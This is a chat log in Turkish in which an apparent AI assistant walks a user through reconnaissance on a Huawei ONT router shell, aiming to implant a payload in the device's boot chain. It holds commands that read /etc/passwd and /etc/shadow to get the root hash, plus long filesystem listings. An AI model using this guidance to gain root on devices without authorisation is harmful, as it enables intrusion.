Patch işe yaramadı. Şuan başka cihazda bağlandım shell komutları açık.

WAP(Dopra Linux) # ls
bin      etc      lib      mnt      sbin     tmp
boot     html     libexec  proc     share    usr
dev      init     linuxrc  root     sys      var
WAP(Dopra Linux) #


Canlı shell erişimin var — bu çok değerli. Patch'in neden çalışmadığını anlamak ve doğru stratejiyi belirlemek için bu cihazdan bilgi toplayalım.

Şu komutları çalıştırabilir misin:

```sh
cat /etc/passwd
```

```sh
cat /etc/shadow
```

```sh
ls -la /mnt/jffs2/
```

```sh
grep -n "control_audit\|jffs2" /usr/bin/sdk_init.sh | head -20
```

Bu 4 komutun çıktısı bize şunları gösterecek:
1. Root şifresi ne (shadow hash)
2. /mnt/jffs2'de hangi dosyalar var (payload yazılmış mı kontrol)
3. `sdk_init.sh`'nin `control_audit.sh`'ı gerçekten çağırıp çağırmadığı


WAP(Dopra Linux) # cat /etc/passwd
root:*:0:0:root:/root:/sbin/nologin
srv_amp:x:3003:2002:hw_srv_amp:/var/srv_amp:/bin/false
srv_web:x:3004:2002:hw_srv_web:/var/srv_web:/bin/false
osgi_proxy:x:3005:2000:hw_osgi_proxy:/var/osgi_proxy:/bin/false
srv_igmp:x:3006:2002:hw_srv_igmp:/var/srv_igmp:/bin/false
cfg_cwmp:x:3007:2001:hw_cfg_cwmp:/var/cfg_cwmp:/bin/false
srv_ssmp:x:3008:2002:hw_srv_ssmp:/var/srv_ssmp:/bin/false
cfg_cli:x:3010:2001:hw_cfg_cli:/var/cfg_cli:/bin/false
srv_bbsp:x:3012:2002:hw_srv_bbsp:/var/srv_bbsp:/bin/false
srv_dbus:x:3014:2002:hw_srv_dbus:/var/srv_dbus:/bin/false
srv_udm:x:3015:2002:hw_srv_udm:/var/srv_udm:/bin/false
srv_apm:x:3018:2014:hw_srv_apm:/var/srv_apm:/bin/false
srv_kmc:x:3020:500:hw_srv_kmc:/var/srv_kmc:/bin/false
srv_cms:x:3021:2002:hw_srv_cms:/var/srv_cms:/bin/false
srv_mu:x:3022:2002:hw_srv_mu:/var/srv_mu:/bin/false
srv_em:x:3023:2002:hw_srv_em:/var/srv_em:/bin/false
srv_clid:x:3030:2002:hw_srv_clid:/var/srv_clid:/bin/false
srv_comm:x:3029:2034:hw_srv_comm:/var/srv_comm:/bin/false
srv_voice:x:4002:2002:srv_voice:/var/service:/bin/false
srv_appm:x:4003:2002:srv_appm:/var/service:/bin/false
srv_cagent:x:4005:2000:srv_cagent:/var/srv_cagent:/bin/false
nobody:x:65534:65534::/tmp:/bin/false
squashfs:x:1001:100:hw_squashfs:/var/squashfs:/bin/false
srv_ethoam:x:3013:2002:hw_srv_ethoam:/var/srv_ethoam:/bin/false
srv_ret:x:3050:2002:hw_srv_ret:/var/srv_ret:/bin/false
srv_pcpc:x:3051:2002:hw_srv_pcpc:/var/srv_pcpc:/bin/false
srv_dot1x:x:3052:2002:hw_srv_dot1x:/var/srv_dot1x:/bin/false
srv_ddns:x:3054:2002:hw_srv_ddns:/var/srv_ddns:/bin/false
srv_upnpd:x:3056:2002:hw_srv_upnpd:/var/srv_upnpd:/bin/false
srv_emdi:x:3059:2002:hw_srv_emdi:/var/srv_emdi:/bin/false
srv_wifi:x:3024:2002:hw_srv_wifi:/var/srv_wifi:/bin/false
cfg_wifi:x:3025:2002:hw_cfg_wifi:/var/cfg_wifi:/bin/false
cfg_omci:x:3009:2001:hw_cfg_omci:/var/cfg_omci:/bin/false
WAP(Dopra Linux) # cat /etc/shadow
cat: can't open '/etc/shadow': No such file or directory
WAP(Dopra Linux) # ls -la /mnt/jffs2/
drwxrwx--T   11 root     service       5128 Jan  1 00:01 .
drwxr-xr-x    5 root     root           100 Jan  1 00:00 ..
drwxr-xr-x    2 root     root           160 Jan  1 00:00 1152
drwxr-x---    2 srv_ssmp service        512 Mar 20  2023 CfgFile_Backup
-rw-r--r--    1 srv_bbsp service          1 Jan  1 00:01 DHCPlasterrwan2
-rw-r-----    1 cfg_omci config           8 Jan  1 00:00 FTCRC
-rwxrwx---    1 srv_ssmp service          2 Jan  1 00:00 Updateflag_bak
drwxrwx---    6 osgi_pro osgi           424 Mar 20  2023 app
drwxr-xr-x    2 root     root           160 Jan  1 00:00 asan_test
-rw-r--r--    1 srv_ssmp service          0 Jan  1 00:00 backup_ok
-rw-r-----    1 root     root             7 Jan  1 00:00 bob_type
-rw-r-----    1 srv_voic service       8192 Jan  1 00:00 callloginfo.db
-rw-r--r--    1 root     root             0 Jan  1 00:00 ceaseadv.conf
drwx------    2 srv_ssmp service        440 Jan  1 00:03 certs
-rw-r--r--    1 srv_ssmp service          1 Jan  1 00:00 cfmflag
drwxr-x---    2 srv_clid service        160 Jan  1 00:01 customize
-rw-rw----    1 srv_clid service         17 Mar 20  2023 customize.txt
-rw-rw----    1 srv_clid service        152 Mar 20  2023 customizepara.txt
-rwxr-x---    1 srv_bbsp service         33 Jan  1  1981 dhcp_data_a
-rwxr-x---    1 srv_bbsp service         11 Jan  1  1981 dhcp_lastip
drwxr-xr-x    2 srv_bbsp service        160 Jan  1 00:00 dhcpc
-rw-r-----    1 root     root            36 Jan  1 00:02 dm_reset_info
-rw-r--r--    1 root     root             0 Jan  1 00:00 dypack_debug
-rw-r--r--    1 srv_ssmp service         30 Jan  1 00:01 factoryResetTypefile
-rw-r-----    1 root     root            22 Jan  1 00:01 factory_file
-rw-r--r--    1 srv_ssmp service          2 Mar 20  2023 fsok
-rw-r-----    1 cfg_omci config           8 Jan  1 00:00 ftvoipcfgstate
-rw-r--r--    1 root     root             6 Mar 20  2023 hard_version
-rw-rw----    1 srv_ssmp service       3563 Jan  1 00:00 hw_boardinfo
-rw-rw----    1 srv_ssmp service       3563 Mar 20  2023 hw_boardinfo.bak
-rw-r--r--    1 squashfs users           89 Mar 20  2021 hw_bootcfg.xml
-rw-r-----    1 srv_ssmp service      32920 Jan  1 00:01 hw_ctree.xml
-rw-r-----    1 srv_ssmp service      33592 Jan  1 00:00 hw_ctree_backup.xml
-rw-r-----    1 srv_ssmp service      32920 Jan  1 00:01 hw_ctree_bak.xml
-rw-rw----    1 srv_ssmp service      19992 Jan  1 00:00 hw_default_ctree.xml
-rw-r-----    1 srv_ssmp service         89 Jan  1 00:00 hw_hardinfo_feature
-rw-r-----    1 srv_ssmp service       6661 May 16  2023 hwflashlog.bin
-rw-r-----    1 srv_ssmp service      33407 May 13  2023 hwkeyinfogetlog.bin
-rw-r-----    1 srv_ssmp service      27751 May 15  2023 hwnfflog.bin
-rw-r-----    1 srv_ssmp service       5632 Jan  1 00:01 hwontdebuglogctrl.bin
-rw-r-----    1 srv_ssmp service      23680 Jan  1 00:01 hwontdebuglogdata.bin
-rw-r-----    1 srv_ssmp service     129996 Jan  1 00:01 hwontlog.bin
-rw-r-----    1 srv_ssmp service       5231 May  8  2023 hwponlog.bin
-rw-r--r--    1 root     root           275 Jan  1 00:00 keyreleasecount.txt
-rw-r-----    1 srv_kmc  kmc           2848 Jan  1 00:02 kmc_store_A
-rw-r-----    1 srv_kmc  kmc           2848 Jan  1 00:02 kmc_store_B
-rw-r-----    1 root     service      29479 Jan  1 00:00 lastsysinfo.tar.gz
drwxr-x---    2 srv_ssmp service        232 Jan  1 00:00 lastword
-rw-r--r--    1 root     root            21 Mar 20  2023 main_version
-rw-r--r--    1 root     root             9 Jan  1 00:00 mount_ok
-rw-r--r--    1 root     root             9 Jan  1 00:00 mount_osgi_ok
-rw-rw-r--    1 srv_mu   service          4 Jan  1 00:07 mu_status_info
-rw-r--r--    1 srv_ssmp service          4 May 15  2023 nffruntimes
-rw-r-----    1 cfg_omci config           0 Jan  1 00:00 oldcrc
-rw-r--r--    1 cfg_omci config           2 Dec 29  2021 onlinecounter
-rwxr-xr-x    1 root     root             4 Jan  1 00:00 ontstatusfile
-rw-r--r--    1 root     root          1052 Jan  1 00:00 optic_init_par.bin
-rwxrw-rw-    1 srv_bbsp service          3 Jan  1 00:00 ppplasterr257
-rw-r-----    1 root     root            19 Jan  1 00:01 recovername
-rw-r--r--    1 squashfs users            1 Mar 20  2021 resetkey
drwxr-x---    4 srv_ssmp service        352 Jan  1 00:00 restore
-rwxrwxr-x    1 root     root             4 Jan  1 00:00 scflie_0
-rw-r--r--    1 root     root             4 Mar 20  2023 scflie_1
-rw-rw-rw-    1 osgi_pro osgi             0 Jan  1 00:00 smartapi_debug.log
-rw-r-----    1 srv_web  service          0 Jan  1 00:01 smartshowuserguide
-rw-r--r--    1 srv_ssmp service       1013 Jan  1 00:00 upgrade_script_log.txt
-rw-r--r--    1 root     root          8912 Jan  1 00:02 wifi_cali_data.kv
-rw-r--r--    1 root     root          2336 Jan  1 00:02 wifi_cali_data_2g.kv
-rw-r-----    1 cfg_omci config           0 Jan  1 00:00 xmlcfgerrorcode
-rw-r-----    1 srv_amp  service          2 Jan  1 00:00 xpon_mode
WAP(Dopra Linux) # grep -n "control_audit\|jffs2" /usr/bin/sdk_init.sh | head -2
0
grep: /usr/bin/sdk_init.sh: No such file or directory
WAP(Dopra Linux) #


Çok önemli bulgular:

1. **Root shell = `/sbin/nologin`** — root login tamamen kapalı
2. **`/etc/shadow` yok** — şifre sistemi farklı çalışıyor
3. **`sdk_init.sh` o yolda değil** — path farklı

Bu cihazda doğru yolları bulmamız lazım. Şunları çalıştırır mısın:

```sh
find / -name "sdk_init*" 2>/dev/null
```

```sh
find / -name "control_audit*" 2>/dev/null
```

```sh
grep -r "jffs2" /etc/init.d/ 2>/dev/null | head -20
```

```sh
cat /proc/version
```

```sh
cat /mnt/jffs2/main_version
```


WAP(Dopra Linux) # find / -name "sdk_init*" 2>/dev/null
WAP(Dopra Linux) # find / -name "control_audit*" 2>/dev/null
WAP(Dopra Linux) # grep -r "jffs2" /etc/init.d/ 2>/dev/null | head -20
WAP(Dopra Linux) # cat /proc/version
Linux version 4.4.240 (oe-user@oe-host) (gcc version 7.3.0 (Compiler CPU V200R006C10SPC010B002) ) #1 SMP Fri Dec 17 01:10:57 CST 2021
WAP(Dopra Linux) # cat /mnt/jffs2/main_version
V500R020C00SPC080B160WAP(Dopra Linux) #

sdk_init ve control audit dosyaları hiç yok. Ncap yada tftpd32 ile içine yüklemeliyiz.


Önemli fark var — bu cihaz **V500R020C00** firmware, hedef dump ise **V500R022C10**. Boot zinciri tamamen farklı olabilir.

Bu canlı cihazdan boot sürecini anlayalım. Şunları çalıştır:

```sh
ls /etc/init.d/
```

```sh
cat /proc/cmdline
```

```sh
ps | grep -i "init\|boot\|start" | head -20
```

```sh
ls -la /mnt/jffs2/*.sh 2>/dev/null; ls -la /mnt/jffs2/*.xml 2>/dev/null | head -5
```

```sh
grep -rl "jffs2" /etc/ 2>/dev/null
```


WAP(Dopra Linux) # ls /etc/init.d/
ls: /etc/init.d/: No such file or directory
WAP(Dopra Linux) # cat /proc/cmdline
noalign mem=494M flashsize=0x20000000 console=ttyAMA1,115200 root=/dev/mtdblock7 rootflags=image_off=0x28c094 rootfstype=squashfs mtdparts=hinand:0x200000(bootcode)raw,0x1fe00000(ubilayer_v5) ubi.mtd=1 maxcpus=2 l2_cache=l2x0 coherent_pool=4M flash_control=fmc flash_chip=spinand user_debug=0x1f panic=1 skb_priv=224 highres=off debug_ll=off quiet
WAP(Dopra Linux) # ps | grep -i "init\|boot\|start" | head -20
    1 root      1496 S    init
 4108 srv_clid  1504 S    grep -i init\|boot\|start
WAP(Dopra Linux) # ls -la /mnt/jffs2/*.sh 2>/dev/null; ls -la /mnt/jffs2/*.xml 2
>/dev/null | head -5
-rw-r--r--    1 squashfs users           89 Mar 20  2021 /mnt/jffs2/hw_bootcfg.xml
-rw-r-----    1 srv_ssmp service      32920 Jan  1 00:01 /mnt/jffs2/hw_ctree.xml
-rw-r-----    1 srv_ssmp service      33592 Jan  1 00:00 /mnt/jffs2/hw_ctree_backup.xml
-rw-r-----    1 srv_ssmp service      32920 Jan  1 00:01 /mnt/jffs2/hw_ctree_bak.xml
-rw-rw----    1 srv_ssmp service      19992 Jan  1 00:00 /mnt/jffs2/hw_default_ctree.xml
WAP(Dopra Linux) # grep -rl "jffs2" /etc/ 2>/dev/null
/etc/ppp/ip-up
/etc/ppp/ipv6-up
/etc/profile
/etc/wap/clear_file.list
/etc/wap/collect/bbsp_collect
/etc/wap/collect/ldsp_pdt_collect
/etc/wap/collect/smart_collect
/etc/wap/collect/smart_collect_ex
/etc/wap/collect/ssmp_collect
/etc/wap/collect/ssmp_pdt_collect
/etc/wap/collect/wifi_pdt_collect
/etc/wap/customize/china/recover0.sh
/etc/wap/customize/china/recover1.sh
/etc/wap/customize/china/recover2.sh
/etc/wap/customize/china/recover4.sh
/etc/wap/customize/china/recover_ahciot_smart.sh
/etc/wap/customize/china/recover_ahcmcc.sh
/etc/wap/customize/china/recover_bjcu.sh
/etc/wap/customize/china/recover_bjunicom.sh
/etc/wap/customize/china/recover_china3.sh
/etc/wap/customize/china/recover_china4.sh
/etc/wap/customize/china/recover_china5.sh
/etc/wap/customize/china/recover_ciot_smart.sh
/etc/wap/customize/china/recover_cmcc.sh
/etc/wap/customize/china/recover_cncatv.sh
/etc/wap/customize/china/recover_cncatv2.sh
/etc/wap/customize/china/recover_common.sh
/etc/wap/customize/china/recover_common_8011v.sh
/etc/wap/customize/china/recover_common_adaption.sh
/etc/wap/customize/china/recover_common_adaption_triap.sh
/etc/wap/customize/china/recover_common_ap.sh
/etc/wap/customize/china/recover_common_ap_triap.sh
/etc/wap/customize/china/recover_common_rep.sh
/etc/wap/customize/china/recover_common_rep_triap.sh
/etc/wap/customize/china/recover_common_rep_video.sh
/etc/wap/customize/china/recover_common_rt.sh
/etc/wap/customize/china/recover_common_rt_triap.sh
/etc/wap/customize/china/recover_doublewifi.sh
/etc/wap/customize/china/recover_fjct.sh
/etc/wap/customize/china/recover_gdgd.sh
/etc/wap/customize/china/recover_gzgd.sh
/etc/wap/customize/china/recover_hainct.sh
/etc/wap/customize/china/recover_hebcu.sh
/etc/wap/customize/china/recover_jlcu.sh
/etc/wap/customize/china/recover_jsciot_smart.sh
/etc/wap/customize/china/recover_jscmcc.sh
/etc/wap/customize/china/recover_lncu.sh
/etc/wap/customize/china/recover_sccncatv.sh
/etc/wap/customize/china/recover_sdcu.sh
/etc/wap/customize/china/recover_set_ssid1.sh
/etc/wap/customize/china/recover_set_ssid2.sh
/etc/wap/customize/china/recover_shxcncatv.sh
/etc/wap/customize/china/recover_tjunicom.sh
/etc/wap/customize/china/recover_unicom.sh
/etc/wap/customize/china/recover_unicom_sn.sh
/etc/wap/customize/china/recover_xjciot_smart.sh
/etc/wap/customize/china/recover_xjcmcc.sh
/etc/wap/customize/common/recover_aissingle.sh
/etc/wap/customize/common/recover_amnet.sh
/etc/wap/customize/common/recover_at.sh
/etc/wap/customize/common/recover_at2.sh
/etc/wap/customize/common/recover_brazclaro.sh
/etc/wap/customize/common/recover_claro.sh
/etc/wap/customize/common/recover_common.sh
/etc/wap/customize/common/recover_common3.sh
/etc/wap/customize/common/recover_common4.sh
/etc/wap/customize/common/recover_common4_game.sh
/etc/wap/customize/common/recover_common4pair.sh
/etc/wap/customize/common/recover_common5.sh
/etc/wap/customize/common/recover_common_8011v.sh
/etc/wap/customize/common/recover_common_adaption.sh
/etc/wap/customize/common/recover_common_ap.sh
/etc/wap/customize/common/recover_common_rep.sh
/etc/wap/customize/common/recover_common_rep_video.sh
/etc/wap/customize/common/recover_common_rt.sh
/etc/wap/customize/common/recover_comteco.sh
/etc/wap/customize/common/recover_croatiaht.sh
/etc/wap/customize/common/recover_cypruscyta.sh
/etc/wap/customize/common/recover_doublewifi.sh
/etc/wap/customize/common/recover_doublewifi5.sh
/etc/wap/customize/common/recover_doublewifi_oi2.sh
/etc/wap/customize/common/recover_doublewifipwd.sh
/etc/wap/customize/common/recover_dthu.sh
/etc/wap/customize/common/recover_dthu2.sh
/etc/wap/customize/common/recover_globe.sh
/etc/wap/customize/common/recover_globe2.sh
/etc/wap/customize/common/recover_ipran.sh
/etc/wap/customize/common/recover_iraqo3.sh
/etc/wap/customize/common/recover_lattelecom.sh
/etc/wap/customize/common/recover_lattelecom2.sh
/etc/wap/customize/common/recover_magticom.sh
/etc/wap/customize/common/recover_megafon2_v5.sh
/etc/wap/customize/common/recover_morocco_v5.sh
/etc/wap/customize/common/recover_mytime.sh
/etc/wap/customize/common/recover_netlife.sh
/etc/wap/customize/common/recover_nos2.sh
/etc/wap/customize/common/recover_nwt.sh
/etc/wap/customize/common/recover_orangemt.sh
/etc/wap/customize/common/recover_osk.sh
/etc/wap/customize/common/recover_osk2.sh
/etc/wap/customize/common/recover_pccw.sh
/etc/wap/customize/common/recover_pccw3mac.sh
/etc/wap/customize/common/recover_pccw4mac.sh
/etc/wap/customize/common/recover_pccwsmart.sh
/etc/wap/customize/common/recover_pt.sh
/etc/wap/customize/common/recover_ptcl.sh
/etc/wap/customize/common/recover_ptcl2.sh
/etc/wap/customize/common/recover_ptvdf.sh
/etc/wap/customize/common/recover_ptvdf2wifi.sh
/etc/wap/customize/common/recover_ptvdf2wifi_webpwd.sh
/etc/wap/customize/common/recover_ptvdf_webpwd.sh
/etc/wap/customize/common/recover_ptvdfb_webpwd.sh
/etc/wap/customize/common/recover_qtel.sh
/etc/wap/customize/common/recover_rostelecom.sh
/etc/wap/customize/common/recover_safaricom2.sh
/etc/wap/customize/common/recover_set_ssid1.sh
/etc/wap/customize/common/recover_set_ssid2.sh
/etc/wap/customize/common/recover_singtel2.sh
/etc/wap/customize/common/recover_slovak.sh
/etc/wap/customize/common/recover_sonet.sh
/etc/wap/customize/common/recover_stc2.sh
/etc/wap/customize/common/recover_tedata2.sh
/etc/wap/customize/common/recover_teliaest.sh
/etc/wap/customize/common/recover_telkom.sh
/etc/wap/customize/common/recover_telmex.sh
/etc/wap/customize/common/recover_telmex5g.sh
/etc/wap/customize/common/recover_telmexaccess.sh
/etc/wap/customize/common/recover_telmexresale.sh
/etc/wap/customize/common/recover_telmexvula.sh
/etc/wap/customize/common/recover_tm.sh
/etc/wap/customize/common/recover_tmczst2.sh
/etc/wap/customize/common/recover_totalplay.sh
/etc/wap/customize/common/recover_triplet.sh
/etc/wap/customize/common/recover_triplet2.sh
/etc/wap/customize/common/recover_triplet4ap_ap.sh
/etc/wap/customize/common/recover_tripletsingle.sh
/etc/wap/customize/common/recover_true.sh
/etc/wap/customize/common/recover_truerg.sh
/etc/wap/customize/common/recover_truergpwd.sh
/etc/wap/customize/common/recover_ts.sh
/etc/wap/customize/common/recover_ts2.sh
/etc/wap/customize/common/recover_turkcell.sh
/etc/wap/customize/common/recover_turkcell_hgw.sh
/etc/wap/customize/common/recover_une.sh
/etc/wap/customize/common/recover_une2.sh
/etc/wap/customize/common/recover_viettel.sh
/etc/wap/customize/common/recover_viettel2.sh
/etc/wap/customize/cpa.txt
/etc/wap/customize/cpa_cmcc.txt
/etc/wap/customize/cpa_ct.txt
/etc/wap/customize/cpa_cu.txt
/etc/wap/dm.cfg/5117HG8045A5v1.cfg
/etc/wap/dm.cfg/5117HG8141A5v1.cfg
/etc/wap/dm.cfg/5117HG8245Hv5.cfg
/etc/wap/dm.cfg/5117HG8546M5.cfg
/etc/wap/dm.cfg/5117HS8125T5v1.cfg
/etc/wap/dm.cfg/5117HS8125T5v2.cfg
/etc/wap/dm.cfg/5117HS8125Tv2.cfg
/etc/wap/dm.cfg/5117HS8145Cv4.cfg
/etc/wap/dm.cfg/5117HS8145Cv5.cfg
/etc/wap/dm.cfg/5117HS8145V5v1.cfg
/etc/wap/dm.cfg/5117HS8145V5v2.cfg
/etc/wap/dm.cfg/5117HS8145V5v5.cfg
/etc/wap/dm.cfg/5117HS8145V5v6.cfg
/etc/wap/dm.cfg/5117HS8346Rv2.cfg
/etc/wap/dm.cfg/5117HS8545Mv2.cfg
/etc/wap/dm.cfg/5117WA8011Vv1.cfg
/etc/wap/dm.cfg/5118HG8255Qv1.cfg
/etc/wap/dm.cfg/5118HN8080Tv1.cfg
/etc/wap/dm.cfg/5118HN8145Qv1.cfg
/etc/wap/dm.cfg/5118HN8145Vv1.cfg
/etc/wap/dm.cfg/5118HN8145Vv2.cfg
/etc/wap/dm.cfg/5118HN8245Qsv1.cfg
/etc/wap/dm.cfg/5118HN8250Tsv1.cfg
/etc/wap/dm.cfg/5118HN8254v1.cfg
/etc/wap/dm.cfg/5118HN8255Wsv1.cfg
/etc/wap/dm.cfg/5118HN8255Wsv2.cfg
/etc/wap/dm.cfg/5118HN8341Rv1.cfg
/etc/wap/dm.cfg/5118HN8346Qv1.cfg
/etc/wap/dm.cfg/5118HN8541Mv1.cfg
/etc/wap/dm.cfg/5118HN8546Qv1.cfg
/etc/wap/dm.cfg/5118XN8055QBob.cfg
/etc/wap/dm.cfg/5118XN8055Qv1.cfg
/etc/wap/dm.cfg/5118XN8140v1.cfg
/etc/wap/dm.cfg/5118XN8240Bob.cfg
/etc/wap/dm.cfg/5118XN8240v1.cfg
/etc/wap/dm.cfg/5118XN8245Q20v1.cfg
/etc/wap/dm.cfg/5118XN8245QBob.cfg
/etc/wap/dm.cfg/5118XN8245Qv1.cfg
/etc/wap/dm.cfg/5118XN8245Qv2.cfg
/etc/wap/dm.cfg/5118XN8546Wsv1.cfg
/etc/wap/dm.cfg/B650-4E4P.cfg
/etc/wap/dm.cfg/B650-4E4Pv2.cfg
/etc/wap/dm.cfg/B650-8E8P.cfg
/etc/wap/dm.cfg/B850-5E4P.cfg
/etc/wap/dm.cfg/B850-8E8P.cfg
/etc/wap/dm.cfg/HG8245W5-6T-V2.cfg
/etc/wap/dm.cfg/HWSOC15GIPA_HS8346X6-C.cfg
/etc/wap/dm.cfg/HWSOC1A623.cfg
/etc/wap/dm.cfg/HWSOC1B671-3E3W.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v2.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v3.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v4.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v5.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v6.cfg
/etc/wap/dm.cfg/HWSOC1EG8145V5v7.cfg
/etc/wap/dm.cfg/HWSOC1EG8145X6.cfg
/etc/wap/dm.cfg/HWSOC1EG8147X6.cfg
/etc/wap/dm.cfg/HWSOC1EG8245H5.cfg
/etc/wap/dm.cfg/HWSOC1EG8245Qv3.cfg
/etc/wap/dm.cfg/HWSOC1EG8245W5-6T.cfg
/etc/wap/dm.cfg/HWSOC1EG8245W5-8T.cfg
/etc/wap/dm.cfg/HWSOC1EG8247H5.cfg
/etc/wap/dm.cfg/HWSOC1EG8247Qv2.cfg
/etc/wap/dm.cfg/HWSOC1HG8031W5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8045v5.cfg
/etc/wap/dm.cfg/HWSOC1HG8145V5-20v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8145X6.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5-PRO.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5_128.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v10.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v11.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v12.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v13.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v14.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v15.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v2.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v4.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v5.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v6.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v7.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v8.cfg
/etc/wap/dm.cfg/HWSOC1HG8145v5v9.cfg
/etc/wap/dm.cfg/HWSOC1HG8147X6.cfg
/etc/wap/dm.cfg/HWSOC1HG8240T5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8240T5v2.cfg
/etc/wap/dm.cfg/HWSOC1HG8245H5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8245Hv7.cfg
/etc/wap/dm.cfg/HWSOC1HG8245Hv8.cfg
/etc/wap/dm.cfg/HWSOC1HG8245Q5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5-6T-V1.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5-6T-V2.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v2.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v3.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v4.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v5.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v6.cfg
/etc/wap/dm.cfg/HWSOC1HG8245W5v7.cfg
/etc/wap/dm.cfg/HWSOC1HG8245X6-10.cfg
/etc/wap/dm.cfg/HWSOC1HG8245X6-11.cfg
/etc/wap/dm.cfg/HWSOC1HG8245X6-20.cfg
/etc/wap/dm.cfg/HWSOC1HG8247Hv3.cfg
/etc/wap/dm.cfg/HWSOC1HG8247Q5v1.cfg
/etc/wap/dm.cfg/HWSOC1HG8247V5.cfg
/etc/wap/dm.cfg/HWSOC1HG8247W5-6T.cfg
/etc/wap/dm.cfg/HWSOC1HG8247W5.cfg
/etc/wap/dm.cfg/HWSOC1HG8247W5v1.cfg
/etc/wap/dm.cfg/HWSOC1HS8045V5.cfg
/etc/wap/dm.cfg/HWSOC1HS8140H5.cfg
/etc/wap/dm.cfg/HWSOC1HS8145H5.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v1.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v3.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v4.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v5.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v7.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V5v8.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v1.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v1_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v2.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v2_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v3.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v3_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v4.cfg
/etc/wap/dm.cfg/HWSOC1HS8145V6v5.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v2.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v2_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v3.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v3_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v4.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v4_sdn.cfg
/etc/wap/dm.cfg/HWSOC1HS8145X6v5.cfg
/etc/wap/dm.cfg/HWSOC1HS8346V5v1.cfg
/etc/wap/dm.cfg/HWSOC1HS8346V5v2.cfg
/etc/wap/dm.cfg/HWSOC1HS8346V5v3.cfg
/etc/wap/dm.cfg/HWSOC1HS8346V5v5.cfg
/etc/wap/dm.cfg/HWSOC1HS8346Vv2.cfg
/etc/wap/dm.cfg/HWSOC1HS8346Vv3.cfg
/etc/wap/dm.cfg/HWSOC1HS8346Vv4.cfg
/etc/wap/dm.cfg/HWSOC1HS8346X6.cfg
/etc/wap/dm.cfg/HWSOC1HS8346X6v2.cfg
/etc/wap/dm.cfg/HWSOC1HS8346X6v3.cfg
/etc/wap/dm.cfg/HWSOC1HS8346X6v4.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv3.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv4.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv5.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv6.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv7.cfg
/etc/wap/dm.cfg/HWSOC1HS8546Vv8.cfg
/etc/wap/dm.cfg/HWSOC1HS8546X6.cfg
/etc/wap/dm.cfg/HWSOC1HS8546X6v2.cfg
/etc/wap/dm.cfg/HWSOC1HS8546X6v4.cfg
/etc/wap/dm.cfg/HWSOC1K562.cfg
/etc/wap/dm.cfg/HWSOC1K562e.cfg
/etc/wap/dm.cfg/HWSOC1K662R.cfg
/etc/wap/dm.cfg/HWSOC1K662c-10.cfg
/etc/wap/dm.cfg/HWSOC1K662c-10v1.cfg
/etc/wap/dm.cfg/HWSOC1K662c-20.cfg
/etc/wap/dm.cfg/HWSOC1K662d.cfg
/etc/wap/dm.cfg/HWSOC1K662m.cfg
/etc/wap/dm.cfg/HWSOC1K662mv1.cfg
/etc/wap/dm.cfg/HWSOC1K662p.cfg
/etc/wap/dm.cfg/HWSOC1K662u.cfg
/etc/wap/dm.cfg/HWSOC1K662w.cfg
/etc/wap/dm.cfg/HWSOC1LG8035V5v1.cfg
/etc/wap/dm.cfg/HWSOC1LG8245X6-10.cfg
/etc/wap/dm.cfg/HWSOC1T623L.cfg
/etc/wap/dm.cfg/HWSOC1UNK662c-10.cfg
/etc/wap/dm.cfg/HWSOC1V662.cfg
